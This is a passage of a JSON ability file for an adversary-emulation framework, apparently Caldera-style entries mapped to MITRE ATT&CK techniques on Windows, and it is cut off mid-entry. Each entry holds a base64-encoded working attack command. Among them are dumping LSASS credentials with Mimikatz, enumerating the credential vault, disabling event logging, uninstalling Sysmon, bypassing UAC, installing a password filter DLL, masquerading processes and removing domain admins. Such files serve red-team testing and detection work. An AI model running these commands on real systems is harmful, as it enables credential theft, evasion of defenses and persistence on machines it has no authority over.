"technique_id": "T1497.001", "platform": "windows", "name": "Detect Virtualization Environment (Windows)", "requirements": [], "tactic": "multiple", "buckets": ["multiple"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["JGVycm9yLmNsZWFyKCk="], "executor": "psh", "access": {}, "description": "Windows Management Instrumentation(WMI) objects contains system information which helps to detect virtualization. This command will specifically attempt to get the CurrentTemperature value from this object and will check to see if the attempt results in an error that contains the word supported. This is meant to find the result of Not supported, which is the result if run in a virtual machine\n", "variations": []}, {"test": "JHNlcmN1cml0eVNlcnZpY2VzID0gQCggICAgIm1zbXBlbmciLCAgICAid2luZGVmZW5kIiwgICAgIm1zc2Vuc2UiLCAgICAic2Vuc2UiLCAgICAibWljcm9zb2Z0LnRyaS5zZW5zb3IiLCAgICAibWljcm9zb2Z0LnRyaS5zZW5zb3IudXBkYXRlciIsICAgICJjYXZwIiwgICAgImNiIiwgICAgImNhcmJvbmJsYWNrIiwgICAgImNhcmJvbmJsYWNrayIsICAgICJjYmNvbW1zIiwgICAgImNic3RyZWFtIiwgICAgImNzZmFsY29uc2VydmljZSIsICAgICJjc2ZhbGNvbmNvbnRhaW5lciIsICAgICJjc2FnZW50IiwgICAgImNzZGV2aWNlY29udHJvbCIsICAgICJjc2ZhbGNvbnNlcnZpY2UiLCAgICAieGFndCIsICAgICJ4YWd0bm90aWYiLCAgICAiZmVfYXZrIiwgICAgImZla2VybiIsICAgICJmZWVsYW0iLCAgICAiZmV3c2NzZXJ2aWNlIiwgICAgImVrcm4iLCAgICAiZWd1aXByb3h5IiwgICAgImVndWkiLCAgICAiZWFtb25tIiwgICAgImVlbGFtIiwgICAgImVoZHJ2IiwgICAgImVrcm5lcGZ3IiwgICAgImVwZnd3ZnAiLCAgICAiZWtiZGZsdCIsICAgICJlcGZ3IiwgICAgImZzZ2szMnN0IiwgICAgImZzd2VidWlkIiwgICAgImZzZ2szMiIsICAgICJmc21hMzIiLCAgICAiZnNzbTMyIiwgICAgImZucmIzMiIsICAgICJmc2F1YSIsICAgICJmc29yc3AiLCAgICAiZnNhdjMyIiwgICAgImYtc2VjdXJlIGdhdGVrZWVwZXIgaGFuZGxlciBzdGFydGVyIiwgICAgImYtc2VjdXJlIG5ldHdvcmsgcmVxdWVzdCBicm9rZXIiLCAgICAiZi1zZWN1cmUgd2VidWkgZGFlbW9uIiwgICAgImZzbWEiLCAgICAiZnNvcnNwY2xpZW50IiwgICAgImYtc2VjdXJlIGdhdGVrZWVwZXIiLCAgICAiZi1zZWN1cmUgaGlwcyIsICAgICJmc2J0cyIsICAgICJmc25pIiwgICAgImZzdmlzdGEiLCAgICAiZi1zZWN1cmUgZmlsdGVyIiwgICAgImYtc2VjdXJlIHJlY29nbml6ZXIiLCAgICAiZnNlcyIsICAgICJmc2Z3IiwgICAgImZzZGZ3IiwgICAgImZzbXMiLCAgICAiZnNkZXZjb24iKTskY3VycmVudFNlcnZpY2VzID0gR2V0LVNlcnZpY2UgfCBTZWxlY3QtT2JqZWN0IC1Qcm9wZXJ0eSBOYW1lO2ZvcmVhY2ggKCRzdmMgaW4gJGN1cnJlbnRTZXJ2aWNlcykgeyAgICBmb3JlYWNoICgkc2VjU3ZjIGluICRzZXJjdXJpdHlTZXJ2aWNlcykgeyAgICAgICAgaWYgKCRzdmMuTmFtZSAtbGlrZSAkc2VjU3ZjKSB7ICAgICAgICAgICAgJHN2Y0RldGFpbHMgPSBHZXQtU2VydmljZSAtbmFtZSAkc3ZjLk5hbWUgfCBTZWxlY3QtT2JqZWN0IC1Qcm9wZXJ0eSBOYW1lLCBEaXNwbGF5TmFtZSwgU3RhdHVzOyAgICAgICAgICAgIFdyaXRlLUhvc3QgIlshXSBTZWN1cml0eSBzZXJ2aWNlIGZvdW5kOiI7ICAgICAgICAgICAgV3JpdGUtSG9zdCAiICAgIFNlcnZpY2UgTmFtZTpgdCIsICRzdmNEZXRhaWxzLk5hbWU7ICAgICAgICAgICAgV3JpdGUtSG9zdCAiICAgIERpc3BsYXkgTmFtZTpgdCIsICRzdmNEZXRhaWxzLkRpc3BsYXlOYW1lOyAgICAgICAgICAgIFdyaXRlLUhvc3QgIiAgICBTdGF0dXM6YHRgdCIsICRzdmNEZXRhaWxzLlN0YXR1czsgICAgICAgICAgICBXcml0ZS1Ib3N0ICIiOyAgICAgICAgfSAgICB9fQ==", "ability_id": "1258b063-27d6-489b-a677-4807faacf868", "technique_name": "Virtualization/Sandbox Evasion: System Checks", "additional_info": {}, "privilege": "", "technique_id": "T1497.001", "platform": "windows", "name": "Check Security Services", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Check for security services. Security service list is based on the SUNBURST malware observed in a Solarwinds related compromise (https://research.checkpoint.com/2020/sunburst-teardrop-and-the-netsec-new-normal/).", "variations": []}, {"test": "d21pYyB1c2VyYWNjb3VudCBnZXQgL0FMTCAvZm9ybWF0OmNzdg==", "ability_id": "b0255b5120cbabc062d8d4510a142c3b", "technique_name": "Windows Management Instrumentation", "additional_info": {}, "privilege": "", "technique_id": "T1047", "platform": "windows", "name": "WMI Reconnaissance Users", "requirements": [], "tactic": "execution", "buckets": ["execution"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "An adversary might use WMI to list all local User Accounts. \nWhen the test completes , there should be local user accounts information displayed on the command line.\n", "variations": []}, {"test": "YXR0cmliLmV4ZSAraCAldGVtcCVcVDE1NjQuMDAxLnR4dA==", "ability_id": "66a5fd5f244819181f074dd082a28905", "technique_name": "Hide Artifacts: Hidden Files and Directories", "additional_info": {}, "privilege": "", "technique_id": "T1564.001", "platform": "windows", "name": "Create Windows Hidden File with Attrib", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["ZGVsIC9BOkggJXRlbXAlXFQxNTY0LjAwMS50eHQgPm51bCAyPiYx"], "executor": "cmd", "access": {}, "description": "Creates a file and marks it as hidden using the attrib.exe utility.Upon execution, open File Epxplorer and enable View > Hidden Items. Then, open Properties > Details on the file\nand observe that the Attributes are \"SH\" for System and Hidden.\n", "variations": []}, {"test": "dmF1bHRjbWQgL2xpc3RjcmVkczoiV2ViIENyZWRlbnRpYWxzIiAvYWxs", "ability_id": "f5606cc7632289d5ca72d4a485c14f6b", "technique_name": "Credentials from Password Stores", "additional_info": {}, "privilege": "", "technique_id": "T1555", "platform": "windows", "name": "Enumerate credentials from Windows Credential Manager using vaultcmd.exe [Web Credentials]", "requirements": [], "tactic": "credential-access", "buckets": ["credential-access"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "This module will enumerate credentials stored in Web Credentials vault of Windows Credential Manager using builtin utility vaultcmd.exe", "variations": []}, {"test": "bmx0ZXN0LmV4ZSAvZGNsaXN0OiV1c2VyZG5zZG9tYWluJQ==", "ability_id": "ac20e592bc912bddff4d6b88289095f0", "technique_name": "Remote System Discovery", "additional_info": {}, "privilege": "", "technique_id": "T1018", "platform": "windows", "name": "Remote System Discovery - nltest", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "Identify domain controllers for specified domain.\n\nUpon successful execution, cmd.exe will execute nltest.exe against a target domain to retrieve a list of domain controllers. Output will be via stdout.\n", "variations": []}, {"test": "Zm9yKCRpPTA7ICRpIC1sZSAxMDAwOyAkaSsrKSB7IFJlc29sdmUtRG5zTmFtZSAtdHlwZSAiVFhUIiAiYXRvbWljcmVkdGVhbS4kKEdldC1SYW5kb20gLU1pbmltdW0gMSAtTWF4aW11bSA5OTk5OTkpLjEyNy4wLjAuMS54aXAuaW8iIC1RdWlja1RpbWVvdXR9", "ability_id": "36d84793f28c1eddb0d2cfb8639c4759", "technique_name": "Application Layer Protocol: DNS", "additional_info": {}, "privilege": "", "technique_id": "T1071.004", "platform": "windows", "name": "DNS Large Query Volume", "requirements": [], "tactic": "command-and-control", "buckets": ["command-and-control"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "This test simulates an infected host sending a large volume of DNS queries to a command and control server.\nThe intent of this test is to trigger threshold based detection on the number of DNS queries either from a single source system or to a single targe domain.\nA custom domain and sub-domain will need to be passed as input parameters for this test to work. Upon execution, DNS information about the domain will be displayed for each callout.\n", "variations": []}, {"test": "d2V2dHV0aWwgc2wgIk1pY3Jvc29mdC1XaW5kb3dzLUlLRS9PcGVyYXRpb25hbCIgL2U6ZmFsc2U=", "ability_id": "94f51bf01a7036fe02d07b4c18967669", "technique_name": "Impair Defenses: Disable Windows Event Logging", "additional_info": {}, "privilege": "", "technique_id": "T1562.002", "platform": "windows", "name": "Disable Event Logging with wevtutil", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["d2V2dHV0aWwgc2wgIk1pY3Jvc29mdC1XaW5kb3dzLUlLRS9PcGVyYXRpb25hbCIgL2U6dHJ1ZQ=="], "executor": "cmd", "access": {}, "description": "Wevtutil can be used to disable logs. \nNOTE: RansomEXX ransomware uses this to disable Security logs post-encryption.\n", "variations": []}, {"test": "JFBXb3JkID0gQ29udmVydFRvLVNlY3VyZVN0cmluZyAtU3RyaW5nICN7c3VwZXJfcGFzc30gLUFzUGxhaW5UZXh0IC1Gb3JjZTsgJENyZWRlbnRpYWwgPSBOZXctT2JqZWN0IC1UeXBlTmFtZSBTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbCAtQXJndW1lbnRMaXN0ICN7c3VwZXJfdXNlcn0sICRQV29yZDsgaWYoKEdldC1BRFVzZXIgI3tyZW1vdmVfdXNlcn0gLVByb3BlcnRpZXMgbWVtYmVyb2YpLm1lbWJlcm9mIC1saWtlICJDTj1Eb21haW4gQWRtaW5zKiIpezsgICBSZW1vdmUtQURHcm91cE1lbWJlciAtSWRlbnRpdHkgIkRvbWFpbiBBZG1pbnMiIC1NZW1iZXJzICN7cmVtb3ZlX3VzZXJ9IC1DcmVkZW50aWFsICRDcmVkZW50aWFsIC1Db25maXJtOiRGYWxzZTsgfSBlbHNlezsgICAgIHdyaXRlLWhvc3QgIkVycm9yIC0gTWFrZSBzdXJlICN7cmVtb3ZlX3VzZXJ9IGlzIGluIHRoZSBkb21haW4gYWRtaW5zIGdyb3VwIiAtZm9yZWdyb3VuZGNvbG9yIFJlZDsgfQ==", "ability_id": "a0dce6e8a4bf9a406f5a8c3be528b2f5", "technique_name": "Account Access Removal", "additional_info": {}, "privilege": "", "technique_id": "T1531", "platform": "windows", "name": "Remove Account From Domain Admin Group", "requirements": [], "tactic": "impact", "buckets": ["impact"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "This test will remove an account from the domain admins group\n", "variations": []}, {"test": "JENsYXNzID0gTmV3LU9iamVjdCBNYW5hZ2VtZW50Lk1hbmFnZW1lbnRDbGFzcyhOZXctT2JqZWN0IE1hbmFnZW1lbnQuTWFuYWdlbWVudFBhdGgoIldpbjMyX1Byb2Nlc3MiKSk7ICROZXdDbGFzcyA9ICRDbGFzcy5EZXJpdmUoIldpbjMyX0F0b21pYyIpOyAkTmV3Q2xhc3MuUHV0KCk7IEludm9rZS1XbWlNZXRob2QgLVBhdGggV2luMzJfQXRvbWljIC1OYW1lIGNyZWF0ZSAtQXJndW1lbnRMaXN0IG5vdGVwYWQuZXhl", "ability_id": "cc0478bb8fa23ef7e37c94b090cba04d", "technique_name": "Windows Management Instrumentation", "additional_info": {}, "privilege": "", "technique_id": "T1047", "platform": "windows", "name": "Create a Process using obfuscated Win32_Process", "requirements": [], "tactic": "execution", "buckets": ["execution"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["JENsZWFudXBDbGFzcyA9IE5ldy1PYmplY3QgTWFuYWdlbWVudC5NYW5hZ2VtZW50Q2xhc3MoTmV3LU9iamVjdCBNYW5hZ2VtZW50Lk1hbmFnZW1lbnRQYXRoKCJXaW4zMl9BdG9taWMiKSk7IHRyeSB7ICRDbGVhbnVwQ2xhc3MuRGVsZXRlKCkgfSBjYXRjaCB7fQ=="], "executor": "psh", "access": {}, "description": "This test tries to mask process creation by creating a new class that inherits from Win32_Process. Indirect call of suspicious method such as Win32_Process::Create can break detection logic.\n[Cybereason blog post No Win32_ProcessNeeded](https://www.cybereason.com/blog/wmi-lateral-movement-win32)\n", "variations": []}, {"test": "JHMgPSBHZXQtU2VydmljZSAtTmFtZSAje2hvc3Quc2VydmljZS5tb2RpZmlhYmxlfTtpZiAoJHMuc3RhdHVzIC1uZSAnU3RvcHBlZCcpIHsgU3RvcC1TZXJ2aWNlICRzIH07JGV4ZSA9IChHZXQtSXRlbVByb3BlcnR5IC1QYXRoICJIS0xNOlxTeXN0ZW1cQ3VycmVudENvbnRyb2xTZXRcU2VydmljZXNcI3tob3N0LnNlcnZpY2UubW9kaWZpYWJsZX0iKS5JbWFnZVBhdGguc3BsaXQoKVswXTskcGF0aCA9IChSZXNvbHZlLVBhdGggJGV4ZSkuUGF0aDtDb3B5LUl0ZW0gLVBhdGggJHBhdGggLURlc3RpbmF0aW9uICgkcGF0aCArICIuc2F2ZWQiKTtDb3B5LUl0ZW0gLVBhdGggIkM6XFdpbmRvd3NcU3lzdGVtMzJcc25tcHRyYXAuZXhlIiAtRGVzdGluYXRpb24gJHBhdGg=", "ability_id": "52771610-2322-44cf-816b-a7df42b4c086", "technique_name": "Create or Modify System Process: Windows Service", "additional_info": {}, "privilege": "", "technique_id": "T1543.003", "platform": "windows", "name": "Replace a service binary with alternate binary", "requirements": [{"relationship_match": [{"source": "host.service.modifiable"}], "module": "plugins.stockpile.app.requirements.paw_provenance"}], "tactic": "persistence", "buckets": ["persistence"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["JGV4ZSA9IChHZXQtSXRlbVByb3BlcnR5IC1QYXRoICJIS0xNOlxTeXN0ZW1cQ3VycmVudENvbnRyb2xTZXRcU2VydmljZXNcI3tob3N0LnNlcnZpY2UubW9kaWZpYWJsZX0iKS5JbWFnZVBhdGguc3BsaXQoKVswXTsKJHBhdGggPSAoUmVzb2x2ZS1QYXRoICRleGUpLlBhdGg7CklmIChUZXN0LVBhdGggKCRwYXRoICsgIi5zYXZlZCIpKSB7CiAgUmVtb3ZlLUl0ZW0gJHBhdGg7CiAgTW92ZS1JdGVtIC1QYXRoICgkcGF0aCArICIuc2F2ZWQiKSAtRGVzdGluYXRpb24gJHBhdGgKfQ=="], "executor": "psh", "access": {}, "description": "This is an example technique. snmptrap.exe should be changed in the command\nbelow with the new desired service binary. Depending on the value of\nhost.service.modifiable this ability can damage the target system.\n", "variations": []}, {"test": "bmV0IGFjY291bnRz", "ability_id": "e82f39e2-56f8-4f19-8376-b007f9ac5f8a", "technique_name": "Password Policy Discovery", "additional_info": {}, "privilege": "", "technique_id": "T1201", "platform": "windows", "name": "Password Policy", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Password Policy Discovery", "variations": []}, {"test": "UGF0aFRvQXRvbWljc0ZvbGRlclxUMTAwMy4wMDFcYmluXG1pbWlrYXR6LmV4ZSAic2VrdXJsc2E6Om1pbmlkdW1wICV0bXAlXGxzYXNzLkRNUCIgInNla3VybHNhOjpsb2dvbnBhc3N3b3JkcyBmdWxsIiBleGl0", "ability_id": "7ff61586e1037c4dfe877ce488fafe0f", "technique_name": "OS Credential Dumping: LSASS Memory", "additional_info": {}, "privilege": "", "technique_id": "T1003.001", "platform": "windows", "name": "Offline Credential Theft With Mimikatz", "requirements": [], "tactic": "credential-access", "buckets": ["credential-access"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "The memory of lsass.exe is often dumped for offline credential theft attacks. Adversaries commonly perform this offline analysis with\nMimikatz. This tool is available at https://github.com/gentilkiwi/mimikatz and can be obtained using the get-prereq_commands.\n", "variations": []}, {"test": "YWRpZG5zZHVtcCAtdSBkb21haW5cdXNlciAtcCBwYXNzd29yZCAtLXByaW50LXpvbmVzIDE5Mi4xNjguMS4x", "ability_id": "92e90026cd811e2509d57e586867883b", "technique_name": "Remote System Discovery", "additional_info": {}, "privilege": "", "technique_id": "T1018", "platform": "windows", "name": "Remote System Discovery - adidnsdump", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "This tool enables enumeration and exporting of all DNS records in the zone for recon purposes of internal networks\nPython 3 and adidnsdump must be installed, use the get_prereq_command's to meet the prerequisites for this test.\nSuccessful execution of this test will list dns zones in the terminal.\n", "variations": []}, {"test": "UmVtb3ZlLVNtYlNoYXJlIC1OYW1lIFxcdGVzdFxzaGFyZTsgUmVtb3ZlLUZpbGVTaGFyZSAtTmFtZSBcXHRlc3Rcc2hhcmU=", "ability_id": "3d378141044baec8dc52e9328da38405", "technique_name": "Indicator Removal on Host: Network Share Connection Removal", "additional_info": {}, "privilege": "", "technique_id": "T1070.005", "platform": "windows", "name": "Remove Network Share PowerShell", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Removes a Network Share utilizing PowerShell\n", "variations": []}, {"test": "Y29weSAlU3lzdGVtUm9vdCVcU3lzdGVtMzJcd3NjcmlwdC5leGUgJUFQUERBVEElXHN2Y2hvc3QuZXhlIC9ZICYmIGNtZC5leGUgL2MgJUFQUERBVEElXHN2Y2hvc3QuZXhlIC9C", "ability_id": "0c05ae67acce3a0130e88a69c075810f", "technique_name": "Masquerading: Rename System Utilities", "additional_info": {}, "privilege": "", "technique_id": "T1036.003", "platform": "windows", "name": "Masquerading - wscript.exe running as svchost.exe", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["ZGVsIC9RIC9GICVBUFBEQVRBJVxzdmNob3N0LmV4ZSA+bnVsIDI+JjE="], "executor": "cmd", "access": {}, "description": "Copies wscript.exe, renames it, and launches it to masquerade as an instance of svchost.exe.\n\nUpon execution, no windows will remain open but wscript will have been renamed to svchost and ran out of the temp folder\n", "variations": []}, {"test": "c2NodGFza3MgL2NyZWF0ZSAvcnUgc3lzdGVtIC9zYyBkYWlseSAvdHIgImNtZCAvYyBwb3dlcnNoZWxsLmV4ZSAtZXAgYnlwYXNzIC1maWxlIGM6XFQxMDM2LjAwNF9Ob25FeGlzdGluZ1NjcmlwdC5wczEiIC90biB3aW4zMnRpbWVzIC9mICYmIHNjaHRhc2tzIC9xdWVyeSAvdG4gd2luMzJ0aW1lcw==", "ability_id": "7de3d7b4922a7b996d8df36fb22bb118", "technique_name": "Masquerading: Masquerade Task or Service", "additional_info": {}, "privilege": "", "technique_id": "T1036.004", "platform": "windows", "name": "Creating W32Time similar named service using schtasks", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["c2NodGFza3MgL3RuIHdpbjMydGltZXMgL2RlbGV0ZSAvZg=="], "executor": "cmd", "access": {}, "description": "Creating W32Time similar named service (win32times) using schtasks just like threat actor dubbed \"Operation Wocao\"", "variations": []}, {"test": "bWtkaXIgIlxcP1xDOlxXaW5kb3dzIFxTeXN0ZW0zMlwiICYmIGNvcHkgIkM6XFdpbmRvd3NcU3lzdGVtMzJcY21kLmV4ZSIgIlxcP1xDOlxXaW5kb3dzIFxTeXN0ZW0zMlxtbWMuZXhlIiAmJiBta2xpbmsgYzpcdGVzdGJ5cGFzcy5leGUgIlxcP1xDOlxXaW5kb3dzIFxTeXN0ZW0zMlxtbWMuZXhlIg==", "ability_id": "9f0fa7e90c494f73b6424d81d3a75dba", "technique_name": "Abuse Elevation Control Mechanism: Bypass User Access Control", "additional_info": {}, "privilege": "", "technique_id": "T1548.002", "platform": "windows", "name": "Bypass UAC by Mocking Trusted Directories", "requirements": [], "tactic": "multiple", "buckets": ["multiple"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["cmQgIlxcP1xDOlxXaW5kb3dzIFwiIC9TIC9RID5udWwgMj5udWwgJiYgZGVsICJjOlx0ZXN0YnlwYXNzLmV4ZSIgPm51bCAyPm51bA=="], "executor": "cmd", "access": {}, "description": "Creates a fake \"trusted directory\" and copies a binary to bypass UAC. The UAC bypass may not work on fully patched systems\nUpon execution the directory structure should exist if the system is patched, if unpatched Microsoft Management Console should launch\n", "variations": []}, {"test": "MTUyMzk5X1QxMTA1LmJhdCAxPk5VTA==", "ability_id": "4424be28d098a0d95338a60c10a177c6", "technique_name": "Ingress Tool Transfer", "additional_info": {}, "privilege": "", "technique_id": "T1105", "platform": "windows", "name": "Download a file with Microsoft Connection Manager Auto-Download", "requirements": [], "tactic": "command-and-control", "buckets": ["command-and-control"], "timeout": 60, "uploads": [], "parsers": [], "payloads": ["152399_T1105.bat"], "cleanup": ["ZGVsIC9mL3MvcSAldGVtcCVcVDExMDUgPm51bCAyPiYxICYmIHJtZGlyIC9zL3EgJXRlbXAlXFQxMTA1ID5udWwgMj4mMQ=="], "executor": "cmd", "access": {}, "description": "Uses the cmdl32 to download arbitrary file from the internet. The cmdl32 package is allowed to install the profile used to launch the VPN connection. However, the config is modified to download the arbitary file. \nThe issue of cmdl32.exe detecting and deleting the payload by identifying it as not a VPN Servers profile is avoided by setting a temporary TMP folder and denying the delete permission to all files for the user.\nUpon successful execution the test will open calculator and Notepad executable for 10 seconds.\nreference:\nhttps://twitter.com/ElliotKillick/status/1455897435063074824\nhttps://github.com/LOLBAS-Project/LOLBAS/pull/151\nhttps://lolbas-project.github.io/lolbas/Binaries/Cmdl32/\nhttps://strontic.github.io/xcyclopedia/library/cmdl32.exe-FA1D5B8802FFF4A85B6F52A52C871BBB.html\n", "variations": []}, {"test": "c3lzbW9uIC11", "ability_id": "530b4b56ce1798be0c0fc611ef5247e5", "technique_name": "Impair Defenses: Disable or Modify Tools", "additional_info": {}, "privilege": "", "technique_id": "T1562.001", "platform": "windows", "name": "Uninstall Sysmon", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["c3lzbW9uIC1pIC1hY2NlcHRldWxhID5udWwgMj4mMQ=="], "executor": "cmd", "access": {}, "description": "Uninstall Sysinternals Sysmon for Defense Evasion\n", "variations": []}, {"test": "JFRhcmdldCA9ICJDOlxXaW5kb3dzXFN5c3RlbTMyXGNhbGMuZXhlIjsgJFNob3J0Y3V0TG9jYXRpb24gPSAiJGhvbWVcQXBwRGF0YVxSb2FtaW5nXE1pY3Jvc29mdFxXaW5kb3dzXFN0YXJ0IE1lbnVcUHJvZ3JhbXNcU3RhcnR1cFxjYWxjX2V4ZS5sbmsiOyAkV1NjcmlwdFNoZWxsID0gTmV3LU9iamVjdCAtQ29tT2JqZWN0IFdTY3JpcHQuU2hlbGw7ICRDcmVhdGUgPSAkV1NjcmlwdFNoZWxsLkNyZWF0ZVNob3J0Y3V0KCRTaG9ydGN1dExvY2F0aW9uKTsgJENyZWF0ZS5UYXJnZXRQYXRoID0gJFRhcmdldDsgJENyZWF0ZS5TYXZlKCk=", "ability_id": "1f15ab22c39a9b6bb2bb0d77276dfcb3", "technique_name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder", "additional_info": {}, "privilege": "", "technique_id": "T1547.001", "platform": "windows", "name": "Add Executable Shortcut Link to User Startup Folder", "requirements": [], "tactic": "multiple", "buckets": ["multiple"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["UmVtb3ZlLUl0ZW0gIiRob21lXEFwcERhdGFcUm9hbWluZ1xNaWNyb3NvZnRcV2luZG93c1xTdGFydCBNZW51XFByb2dyYW1zXFN0YXJ0dXBcY2FsY19leGUubG5rIiAtRXJyb3JBY3Rpb24gSWdub3Jl"], "executor": "psh", "access": {}, "description": "Adds a non-malicious executable shortcut link to the current users startup directory. Test can be verified by going to the users startup directory and checking if the shortcut link exists. ", "variations": []}, {"test": "JHBhc3N3b3JkRmlsdGVyTmFtZSA9IChDb3B5LUl0ZW0gIlBhdGhUb0F0b21pY3NGb2xkZXJcVDE1NTYuMDAyXHNyY1xBdG9taWNQYXNzd29yZEZpbHRlci5kbGwiIC1EZXN0aW5hdGlvbiAiQzpcV2luZG93c1xTeXN0ZW0zMiIgLVBhc3NUaHJ1KS5iYXNlbmFtZTsgJGxzYUtleSA9IEdldC1JdGVtICJIS0xNOlxTWVNURU1cQ3VycmVudENvbnRyb2xTZXRcQ29udHJvbFxMc2FcIjsgJG5vdGlmaWNhdGlvblBhY2thZ2VzVmFsdWVzID0gJGxzYUtleS5HZXRWYWx1ZSgiTm90aWZpY2F0aW9uIFBhY2thZ2VzIik7ICRub3RpZmljYXRpb25QYWNrYWdlc1ZhbHVlcyArPSAkcGFzc3dvcmRGaWx0ZXJOYW1lOyBTZXQtSXRlbVByb3BlcnR5ICJIS0xNOlxTWVNURU1cQ3VycmVudENvbnRyb2xTZXRcQ29udHJvbFxMc2FcIiAiTm90aWZpY2F0aW9uIFBhY2thZ2VzIiAkbm90aWZpY2F0aW9uUGFja2FnZXNWYWx1ZXM7IFJlc3RhcnQtQ29tcHV0ZXIgLUNvbmZpcm0=", "ability_id": "8c2c28c1db47646b9466143c44427815", "technique_name": "Modify Authentication Process: Password Filter DLL", "additional_info": {}, "privilege": "", "technique_id": "T1556.002", "platform": "windows", "name": "Install and Register Password Filter DLL", "requirements": [], "tactic": "multiple", "buckets": ["multiple"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Uses PowerShell to install and register a password filter DLL. Requires a reboot and administrative privileges.\n", "variations": []}, {"test": "cmVnIHF1ZXJ5ICJIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIE5UXEN1cnJlbnRWZXJzaW9uXFdpbmRvd3MiICYmIHJlZyBxdWVyeSBIS0xNXFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1blNlcnZpY2VzT25jZSAmJiByZWcgcXVlcnkgSEtDVVxTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxSdW5TZXJ2aWNlc09uY2UgJiYgcmVnIHF1ZXJ5IEhLTE1cU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVuU2VydmljZXMgJiYgcmVnIHF1ZXJ5IEhLQ1VcU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVuU2VydmljZXMgJiYgcmVnIHF1ZXJ5ICJIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIE5UXEN1cnJlbnRWZXJzaW9uXFdpbmxvZ29uXE5vdGlmeSIgJiYgcmVnIHF1ZXJ5ICJIS0xNXFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzIE5UXEN1cnJlbnRWZXJzaW9uXFdpbmxvZ29uXFVzZXJpbml0IiAmJiByZWcgcXVlcnkgIkhLQ1VcU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3MgTlRcQ3VycmVudFZlcnNpb25cV2lubG9nb25cXFNoZWxsIiAmJiByZWcgcXVlcnkgIkhLTE1cU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3MgTlRcQ3VycmVudFZlcnNpb25cV2lubG9nb25cXFNoZWxsIiAmJiByZWcgcXVlcnkgSEtMTVxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxTaGVsbFNlcnZpY2VPYmplY3REZWxheUxvYWQgJiYgcmVnIHF1ZXJ5IEhLTE1cU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVuT25jZSAmJiByZWcgcXVlcnkgSEtMTVxTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxSdW5PbmNlRXggJiYgcmVnIHF1ZXJ5IEhLTE1cU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVuICYmIHJlZyBxdWVyeSBIS0NVXFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1biAmJiByZWcgcXVlcnkgSEtDVVxTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxSdW5PbmNlICYmIHJlZyBxdWVyeSBIS0xNXFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFBvbGljaWVzXEV4cGxvcmVyXFJ1biAmJiByZWcgcXVlcnkgSEtDVVxTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxQb2xpY2llc1xFeHBsb3JlclxSdW4gJiYgcmVnIHF1ZXJ5IEhLTE1cc3lzdGVtXGN1cn